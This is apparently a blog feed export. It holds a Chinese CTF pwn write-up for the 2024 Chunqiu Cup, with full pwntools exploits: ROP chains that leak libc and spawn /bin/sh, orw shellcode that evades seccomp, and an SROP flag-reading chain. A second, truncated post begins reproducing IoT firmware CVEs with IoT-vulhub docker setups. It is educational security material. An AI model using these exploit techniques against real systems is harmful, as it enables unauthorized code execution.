*</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    <span class="keyword">while</span> <span class="literal">True</span>:        <span class="keyword">try</span>:            io = init(pwnfile, IPort, libc_name)            vuln     = <span class="number">0x0040125D</span>            prdi     = <span class="number">0x00000000004013d3</span>            prsi_r15 = <span class="number">0x00000000004013d1</span>            <span class="comment"># debug(&#x27;b *0x401286&#x27;)</span>            s( <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(vuln))            payload  = p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(<span class="number">0x00404070</span>) + p64(<span class="number">0</span>) + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])            payload +=  p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(vuln)            payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + payload            sl(payload)            s(p16(<span class="number">0x95c0</span>))            puts_addr = uu64(io.recv(<span class="number">6</span>, timeout=<span class="number">0.5</span>))            <span class="keyword">if</span> puts_addr:                log.success(<span class="string">"===The attack was successful==="</span>)                libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]                system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]                bin_bash  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))                leak(<span class="string">"libc_base"</span>, libc_base)                leak(<span class="string">"puts_addr"</span>, puts_addr)                payload   = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(bin_bash) + p64(system)                <span class="comment"># sleep(0.5)</span>                sl(payload)                itr()            <span class="keyword">else</span>:                <span class="keyword">continue</span>        <span class="keyword">except</span> EOFError:            io.close()            log.failure(<span class="string">"...The attack failed..."</span>)            <span class="keyword">continue</span></code></pre><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二<a id="second"></a></h3><p>下面这位师傅的解法：<a href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</a></p><p><a href="https://blog.csdn.net/AtomTeam/article/details/139672122">2024全国大学生信息安全竞赛（ciscn）半决赛（东北赛区）Pwn题解_2024ciscn华东北赛区wp-CSDN博客</a></p><blockquote><p><strong>setvbuf</strong></p><ul><li>全缓冲：0，<strong>缓冲区满</strong> 或 <strong>调用fflush()</strong> 后输出缓冲区内容。</li><li>行缓冲：1，<strong>缓冲区满</strong> 或 <strong>遇到换行符</strong> 或 <strong>调用fflush()</strong> 后输出缓冲区内容。</li><li>无缓冲：2，直接输出。</li></ul><p>全缓冲应对方法：</p><ul><li>调用setvbuf设置为无缓冲的stdout</li><li>调用fflush函数刷新缓冲区</li><li>填满缓冲区，程序会将所有的缓冲区内容全部输出</li></ul></blockquote><p>这位师傅就是利用程序中的extend()函数来填满缓冲区来拿libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071403848.png" alt="image-20240707140349798"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071418049.png" alt="image-20240707141852935"></p><pre class=" language-highlight PYTHON"><span class="comment"><code class="language-highlight PYTHON"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    vuln     = <span class="number">0x0040125D</span>    prdi     = <span class="number">0x00000000004013d3</span>    ret      = prdi + <span class="number">1</span>    prsi_r15 = <span class="number">0x00000000004013d1</span>    payload = cyclic(<span class="number">0x58</span>) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])    s(payload)    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):        payload = cyclic(<span class="number">0x28</span>) + p64(elf.sym[<span class="string">&#x27;extend&#x27;</span>]) + p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])        sl(payload)        success(i)        <span class="keyword">try</span>:            res = io.recvuntil(<span class="string">b&#x27;hello!\n&#x27;</span>, timeout=<span class="number">0.1</span>)            <span class="keyword">if</span> res:                libc_base = uu64(r64()) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]                <span class="keyword">break</span>        <span class="keyword">except</span> EOFError:            <span class="keyword">continue</span>        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:            log.error(<span class="string">f"...error occurred: <span class="subst">&#123;e&#125;</span>"</span>)            <span class="keyword">continue</span>        <span class="keyword">finally</span>:            <span class="keyword">pass</span>    leak(<span class="string">"libc_base"</span>, libc_base)    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]    bin_bash  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))    payload   = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(prdi) + p64(bin_bash) + p64(system)    sl(payload)    leak(<span class="string">"system"</span>, system)    itr()    <span class="comment"># debug()</span>    <span class="comment"># leak("puts_addr", puts_addr)</span></code></pre><h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三<a id="third"></a></h3><p>参考这位师傅的博客：<a href="https://www.cnblogs.com/imarch22/p/18288087#simplesys">2024春秋杯WP - lmarch2 - 博客园 (cnblogs.com)</a></p><p>在setvbuf附近找到syscall，read调rax，然后利用csu调寄存器、调到syscall执行execve(‘&#x2F;bin&#x2F;sh\x00’)</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071508360.png" alt="image-20240707150839242"></p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, func_addr</span>):    payload = p64(csu1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rdi) + p64(rsi) + p64(rdx) + p64(func_addr) + p64(csu2)    <span class="keyword">return</span> payload<span class="comment"># .text:00000000004013B0 loc_4013B0:                             ; CODE XREF: __libc_csu_init+54↓j</span><span class="comment"># .text:00000000004013B0                 mov     rdx, r14</span><span class="comment"># .text:00000000004013B3                 mov     rsi, r13</span><span class="comment"># .text:00000000004013B6                 mov     edi, r12d</span><span class="comment"># .text:00000000004013B9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><span class="comment"># .text:00000000004013BD                 add     rbx, 1</span><span class="comment"># .text:00000000004013C1                 cmp     rbp, rbx</span><span class="comment"># .text:00000000004013C4                 jnz     short loc_4013B0</span><span class="comment"># .text:00000000004013C6</span><span class="comment"># .text:00000000004013C6 loc_4013C6:                             ; CODE XREF: __libc_csu_init+35↑j</span><span class="comment"># .text:00000000004013C6                 add     rsp, 8</span><span class="comment"># .text:00000000004013CA                 pop     rbx</span><span class="comment"># .text:00000000004013CB                 pop     rbp</span><span class="comment"># .text:00000000004013CC                 pop     r12</span><span class="comment"># .text:00000000004013CE                 pop     r13</span><span class="comment"># .text:00000000004013D0                 pop     r14</span><span class="comment"># .text:00000000004013D2                 pop     r15</span><span class="comment"># .text:00000000004013D4                 retn</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span>    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span>     <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    extend      = <span class="number">0x401287</span>    vuln        = <span class="number">0x40125D</span>    main        = <span class="number">0x401333</span>    flag        = <span class="number">0x404070</span> + <span class="number">0x100</span>    read_plt    = elf.sym[<span class="string">&#x27;read&#x27;</span>]    setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]    prsi_r15    = <span class="number">0x00000000004013d1</span>    prdi        = <span class="number">0x00000000004013d3</span>    csu1        = <span class="number">0x4013CA</span>    csu2        = <span class="number">0x4013B0</span>    s( <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(vuln))    <span class="comment">#bss_addr : "flag"</span>    payload = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(flag) + p64(<span class="number">0</span>) + p64(read_plt) + p64(vuln)     sl(payload)    sleep(<span class="number">0.5</span>)    sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)    <span class="comment">#setvbuf_got-->syscall</span>    <span class="comment"># debug()</span>    payload  = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(setvbuf_got) + p64(<span class="number">0</span>) + p64(read_plt)  <span class="comment">#改setvbuf为syscall</span>    payload += p64(prsi_r15) + p64(flag+<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_plt)     <span class="comment">#通过read输入长度调整rax，配合csu实现execve("/bin/sh\x00", 0, 0)</span>    payload += csu(flag, <span class="number">0</span>, <span class="number">0</span>, setvbuf_got)    s(payload)    <span class="comment"># pause()</span>    s(p8(<span class="number">0x34</span>))    <span class="comment"># pause()</span>    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3b</span>)    <span class="comment"># debug()</span>    itr()</code></pre><p>如果是改别的函数的话会有些麻烦，例如puts，低一字节变化范围内，libc里是没有syscall指令的，需要爆破低二字节高位，也就是十六分之一的概率</p><p>如果是rand或者srand，因为存在延迟绑定，got表还没有跟libc中的函数地址相关联，需要调用一次，那么需要在改got前执行一次extend()函数才能改它们的got表地址</p><p>总的说这位师傅的wp已经是极简的了。</p><h2 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution<a id="Shuffled_Execution"></a></h2><p>libc：2.35-0ubuntu3.8_amd64</p><p>先用\x00开头的shellcode绕过shuffle()的加密</p><p>shellcode绕沙盒的题目，没什么太多好讲的，主要是对orw的替换</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071529824.png" alt="image-20240707152951757"></p><blockquote><p>一些orw惯用方法：</p><p>1.函数替换： cat &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h | grep xxx</p><blockquote><p>open  openat  openat2 ……</p><p>read  readv  preadv  pread64    <strong>mmap</strong> preadv2 ……</p><p>write  writev pwritev ……</p></blockquote><p>2.利用4字节系统调用号绕过</p><p>使用seccomp-tools，如果没有判断sys_number &gt;&#x3D; 0x40000000（不存在<strong>A !&#x3D; ARCH_X86_64</strong>），可以使用<strong>0x40000000|sys_number</strong> 来绕过</p><p>3.侧信道爆破</p><p>write相关函数无法使用，需要利用侧信道来爆破flag</p><p>也会使用mprotect来辅助orw的使用</p></blockquote><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment"># from ctypes import *</span><span class="comment"># import ctypes</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    IPort = <span class="string">&#x27;8.147.135.233 41323&#x27;</span>    pwnfile = <span class="string">&#x27;./Shuffled_Execution&#x27;</span>    libc_name = <span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>     elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    io = init(pwnfile, IPort, libc_name)    <span class="comment"># debug(&#x27;b *$rebase(0x1560)&#x27;)  #x/10i 0x1337000</span>    shellcode = asm(<span class="string">"""</span><span class="string">        add al, al</span><span class="string">        mov rsp, rax</span><span class="string">        add rsp, 0x500</span><span class="string">        mov r12, 0x67616c66   </span><span class="string">        push r12</span><span class="string">        mov rsi, rsp</span><span class="string">        mov rdi, -100</span><span class="string">        mov rdx, 0</span><span class="string">        mov rax, 257</span><span class="string">        syscall        </span><span class="string"></span><span class="string">        mov rdi, 0x10000</span><span class="string">        mov rsi, 0x100</span><span class="string">        mov rdx, 1</span><span class="string">        mov rcx, 2</span><span class="string">        mov r8, rax</span><span class="string">        mov r10, 2</span><span class="string">        mov rax, 9</span><span class="string">        syscall</span><span class="string"></span><span class="string">        mov rdi, 0x1</span><span class="string">        mov rdx, 0x1</span><span class="string">        push 0x100</span><span class="string">        push rax</span><span class="string">        mov rsi, rsp</span><span class="string">        mov rax,0x14</span><span class="string">        syscall</span><span class="string">"""</span>)    s(shellcode)    itr()</code></pre><h2 id="Save-the-preceniss"><a href="#Save-the-preceniss" class="headerlink" title="Save the preceniss"></a>Save the preceniss<a id="Save_the_preceniss"></a></h2><h3 id="不可能的爆破"><a href="#不可能的爆破" class="headerlink" title="不可能的爆破"></a>不可能的爆破<a id="fail"></a></h3><p>这题没出，路走歪了。一直在尝试爆srand(0)，本地debug可以出，理论可行。。。</p><p>记混了，四字节爆破16^8，概率太低了</p><p>本地调通</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071611991.png" alt="image-20240707161117801"></p><p>openat+SROP调用mmap + write，因为爆不出来所以就不多写了</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="keyword">from</span> ctypes <span class="keyword">import</span> *<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    context.log_level = <span class="string">&#x27;info&#x27;</span>    IPort = <span class="string">&#x27;8.147.128.54 44681&#x27;</span>    pwnfile = <span class="string">&#x27;./SavethePrincess&#x27;</span>    libc_name = <span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>     elf  = ELF(pwnfile)    rop  = ROP(pwnfile)    libc = ELF(libc_name)    cdll = cdll.LoadLibrary(libc_name)    <span class="keyword">while</span> <span class="literal">True</span>:        <span class="keyword">try</span>:            io = init(pwnfile, IPort, libc_name)            passwd = <span class="string">b&#x27;nwlrbbmq\x00&#x27;</span>   <span class="comment">#--> srand(0)</span>            <span class="comment">#leak_base</span>            sla(<span class="string">b&#x27;> \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))            <span class="comment"># debug(&#x27;set &#123;char[8]&#125; $rebase(0x04050) = "nwlrbbmq"\n \</span>            <span class="comment">#       tele $rebase(0x04050) \n \</span>            <span class="comment">#       b *$rebase(0x016c5)&#x27;)</span>            sla(<span class="string">b&#x27;please input your password: \n&#x27;</span>, <span class="string">b&#x27;AAA&#x27;</span>)            ru(<span class="string">b&#x27;AAA&#x27;</span>)            base = u64(r(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x356</span>            bss  = base + <span class="number">0x4080</span>            <span class="comment">#leak_canary&libc_base</span>            sla(<span class="string">b&#x27;> \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))            <span class="comment"># pause()</span>            sla(<span class="string">b&#x27;please input your password: \n&#x27;</span>, passwd)            io.recvline()            info = io.recvline(timeout=<span class="number">0.2</span>)            <span class="built_in">print</span>(<span class="string">"info = "</span>, info)            <span class="keyword">if</span> <span class="keyword">not</span> info.startswith(<span class="string">b",nononno"</span>):                <span class="comment"># io.recvuntil(b&#x27;successfully, Embrace the power!!!\n&#x27;)</span>                sl(<span class="string">b&#x27;%9$p-%10$p-%35$p&#x27;</span>)                io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)                canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)                ru(<span class="string">b&#x27;0x&#x27;</span>)                stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)                ru(<span class="string">b&#x27;0x&#x27;</span>)                libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29e40</span>                leak(<span class="string">"canary"</span>, canary)                leak(<span class="string">"libc_base"</span>, libc_base)                leak(<span class="string">"stack"</span>, stack)                prax = libc_base + <span class="number">0x0000000000045eb0</span>                prdi = libc_base + <span class="number">0x000000000002a3e5</span>                prcx = libc_base + <span class="number">0x000000000003d1ee</span>                prsi = libc_base + <span class="number">0x000000000002be51</span>                pr8 = libc_base + <span class="number">0x00000000001659e6</span>                pr10 = libc_base + <span class="number">0x0000000000053b00</span>                prdx__r12 = libc_base + <span class="number">0x000000000011f2e7</span>                syscall = libc_base + <span class="number">0x0000000000091316</span>                pat = libc_base + <span class="number">0x0000000000114534</span>                pr12 = libc_base + <span class="number">0x0000000000035731</span>                push_r12_eax1 = libc_base + <span class="number">0x0000000000165a06</span>                flag_addr = stack - <span class="number">0x60</span>                sla(<span class="string">b&#x27;> \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))                openat  = p64(prdi) + p64(<span class="number">0xffffffffffffff9c</span>) + p64(prsi) + p64(flag_addr) + p64(prdx__r12) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(prax) + p64(<span class="number">257</span>) + p64(syscall)                write = p64(prdi) + p64(<span class="number">1</span>) + p64(prsi) + p64(libc_base + <span class="number">0x262000</span>) + p64(prdx__r12) + p64(<span class="number">0x20</span>)*<span class="number">2</span> + p64(prax) + p64(<span class="number">1</span>) + p64(syscall)                frame_mmap = SigreturnFrame()                frame_mmap.rdi = flag_addr + <span class="number">8</span>                frame_mmap.rsi = <span class="number">0x20</span>                frame_mmap.rdx = <span class="number">1</span>                frame_mmap.r8  = <span class="number">3</span>                frame_mmap.r9  = <span class="number">0</span>                frame_mmap.r10 = <span class="number">2</span>                frame_mmap.rax = <span class="number">9</span>                frame_mmap.rip = syscall                frame_mmap.rsp = flag_addr + <span class="number">0x60</span> + <span class="built_in">len</span>(openat) + <span class="built_in">len</span>(frame_mmap)                payload  = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + openat                 payload += p64(prax) + p64(<span class="number">0xf</span>) + p64(syscall) + flat(frame_mmap)                payload += write                sla(<span class="string">b&#x27;Attack the dragon!!\n&#x27;</span>, payload)                <span class="comment"># leak("base", base)</span>                ru(<span class="string">b&#x27;Did you succeed?\n&#x27;</span>)                info = io.recv(timeout=<span class="number">0.1</span>)                io.close()                <span class="keyword">if</span> <span class="keyword">not</span> info.startswith(<span class="string">b&#x27;flag&#x27;</span>):                    <span class="keyword">continue</span>                <span class="keyword">else</span>:                    log.success(<span class="string">"u win!!!"</span>)                    <span class="built_in">print</span>(<span class="string">"flag is "</span>, info)                    <span class="keyword">break</span>            <span class="keyword">else</span>:                <span class="keyword">continue</span>        <span class="keyword">except</span> EOFError:            <span class="keyword">continue</span>        <span class="keyword">finally</span>:            <span class="keyword">pass</span></code></pre><p>ps：syscall ret指令的寻找：ROPgadget –multibr –binary&#x3D;&#x2F;root&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.35-0ubuntu3.8_amd64&#x2F;libc.so.6 | grep “syscall”</p><p>python低版本中的ctypes库在加载高版本的libc.so文件时会加载失败，需要使用高版本python(python3.8加载libc2.35失败)</p><h3 id="正确解法"><a href="#正确解法" class="headerlink" title="正确解法"></a>正确解法<a id="success"></a></h3><p><a href="https://www.cnblogs.com/imarch22/p/18288087#stdout">lmarch2</a>师傅有写</p><p>自己太粗心了，没观察到栈信息，直接想着用&#x2F;dev&#x2F;urandom的绕过了。通过爆破love字符串，输入buf长度为0xa带出循环次数i，通过判断i位置来判断passwd字段是否正确</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071622115.png" alt="image-20240707162258071"></p><p>exp就不贴了。</p><p>暑假的第一场比赛，算是尽心尽力了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024春秋杯夏季赛-pwn&quot;&gt;&lt;a href=&quot;#2024春秋杯夏季赛-pwn&quot; class=&quot;headerlink&quot; title=&quot;2024春秋杯夏季赛-pwn&quot;&gt;&lt;/a&gt;2024春秋杯夏季赛-pwn&lt;/h1&gt;&lt;p&gt;awdp没看，ctf只做出来两题，还有一题理</summary>
      
    
    
    
    
    <category term="writewp" scheme="http://example.com/tags/writewp/"/>
    
  </entry>
  
  <entry>
    <title>Iot-vulhub复现</title>
    <link href="http://example.com/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-06-25T10:46:14.000Z</published>
    <updated>2024-07-17T06:43:26.009Z</updated>
    
    <content type="html"><![CDATA[<p>借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了<a href="https://github.com/Vu1nT0tal/IoT-vulhub">Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)</a>，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。</p><p>由于我的服务器是国内的，所以构建过程会有很多麻烦，而且dockerhub也g了……</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#env">环境构建</a></p><ul><li><a href="#env_basic">基础环境构建</a></li><li><a href="#env_vul">漏洞环境构建</a></li></ul><p>- <a href="#TOTOLINK">TOTOLINK NR1800X (CVE-2022-41518)</a></p><p>- <a href="#VIVOTEK">Vivotek CC8160 栈溢出漏洞</a></p><p>- <a href="#HG532">华为 HG532 远程代码执行漏洞（CVE-2017-17215）</a></p><p>- <a href="#CISCO">Cisco RV110W 远程代码执行漏洞（CVE-2020-3331）</a></p><p>- <a href="#DLINK">D-Link DIR-859 命令注入漏洞（CVE-2019-17621）</a></p><ul><li><a href="#LOCAL">本地仿真环境搭建</a><ul><li><a href="#binwalk">binwelk 固件解包工具</a></li><li><a href="#qemu">qemu</a></li><li><a href="#firmadyne">Firmadyne 固件仿真工具</a></li><li><a href="#action">模拟运行固件</a></li></ul></li></ul><h1 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建 "></a>环境构建 <a id="env"></a></h1><p><a href="https://wsxk.github.io/IotVulhub/">IoT-vulhub 漏洞复现 – wsxk’s blog – 小菜鸡</a></p><p><a href="https://brvc3.github.io/2023/03/15/IoT-Vulhub%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IoT-Vulhub基础环境搭建 | Brvc3’s Base</a></p><p>docker拉取问题解决：<a href="https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file">https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file</a></p><h2 id="基础环境构建"><a href="#基础环境构建" class="headerlink" title="基础环境构建"></a>基础环境构建<a id="env_basic"></a></h2><p> 构建 ubuntu1604 基础镜像</p><blockquote><p>cd baseImage&#x2F;ubuntu1604 &amp;&amp; docker build -t firmianay&#x2F;ubuntu1604 .</p></blockquote><p> 构建 binwalk 容器</p><blockquote><p>cd baseImage&#x2F;binwalk &amp;&amp; docker build -t firmianay&#x2F;binwalk .</p></blockquote><h2 id="漏洞环境构建"><a href="#漏洞环境构建" class="headerlink" title="漏洞环境构建"></a>漏洞环境构建<a id="env_vul"></a></h2><p>初始化环境（arm&#x2F;mips&#x2F;mipsel）</p><blockquote><p>.&#x2F;init_env.sh xxxx</p></blockquote><p>自动化编译环境，看有什么docker-compose就知道支持什么了</p><blockquote><p>docker-compose -f docker-compose-user.yml build         # QEMU 用户模式模拟</p><p>docker-compose -f docker-compose-system.yml build       # QEMU 系统模式模拟</p><p>docker-compose -f docker-compose-firmadyne.yml build    # firmadyne 模拟</p><p>docker-compose -f docker-compose-firmae.yml build       # firmae 模拟（方便调试）</p></blockquote><p>启动环境</p><blockquote><p>docker-compose -f docker-compose-xxxx.yml up</p></blockquote><p>删除环境</p><blockquote><p>docker-compose -f docker-compose-xxxx.yml down -v</p></blockquote><h1 id="TOTOLINK-NR1800X-CVE-2022-41518"><a href="#TOTOLINK-NR1800X-CVE-2022-41518" class="headerlink" title="TOTOLINK NR1800X (CVE-2022-41518)"></a>TOTOLINK NR1800X (CVE-2022-41518)<a id="TOTOLINK"></a></h1><p><a href="https://paper.seebug.org/1995/">TOTOLINK NR1800X 系列 CVE 分析 (seebug.org)</a></p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><ul><li>docker：攻击、调试主机：192.168.2.1</li><li>qemu-system：固件主机：192.168.2.2</li><li>镜像依赖：<code>firmianay/ubuntu1604 -&gt; firmianay/qemu-system:mipsel</code></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>解压提取固件：</p><blockquote><p>docker run –rm -v $PWD&#x2F;firmware&#x2F;:&#x2F;root&#x2F;firmware firmianay&#x2F;binwalk -Mer “&#x2F;root&#x2F;firmware&#x2F;TOTOLINK_NR1800X_B20210910_ALL.bin”</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903763.png" alt="image-20240623135537006"></p><p>查看文件相关信息  32位 小端序 mips架构</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903687.png" alt="image-20240623135819202"></p><p>1.构建、启动漏洞环境：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./init_env.sh mipseldocker-compose -f docker-compose-system.yml build</code></pre><p>a.缺少firmianay&#x2F;qemu-system:mipsel，自行本地构建，去到对应的文件夹IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel创建镜像</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">docker build -t firmianay/qemu-system:mipsel .</code></pre><p>b.构建时COPY命令出错，由于高版本docker会对文件名检测，需要修改Dockerfile</p><pre class=" language-highlight Dockerfile">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"><code class="language-highlight Dockerfile">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"> ./firmware/_*/squashfs-root /root/squashfs-root</span>ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to build: When using <span class="keyword">COPY</span><span class="language-bash"> with more than one <span class="built_in">source</span> file, the destination must be a directory and end with a /</span></code></pre><p>c.将firmware下子文件夹内的squashfs-root提取到firmware里，修改Dockerfile的步骤为  COPY .&#x2F;firmware&#x2F;squashfs-root &#x2F;root&#x2F;squashfs-root</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">cp -r ./_TOTOLINK_NR1800X_B20210910_ALL.bin.extracted/squashfs-root/ ./</code></pre><p>2.启动容器</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">docker-compose -f docker-compose-system.yml up</code></pre><p>d.运行爆错TOTO-system   | &#x2F;bin&#x2F;sh: 1: .&#x2F;run.sh: Permission denied，服务没起起来</p><blockquote><p>Dockerfile中添加  RUN chmod +x &#x2F;bin&#x2F;run.sh</p></blockquote><p>e.重新构建启动，会爆缺少debian_wheezy_mipsel_standard.qcow2文件，这是在我们qwmu-system构建时(a步骤)中进行构建，我们需要本地下载下来，重新走一遍12步骤</p><blockquote><p>修改&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel&#x2F;images&#x2F;download.sh，原链接改为<a href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></p></blockquote><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">vim ./download.sh#!/bin/bash# 3.2.0wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2wget 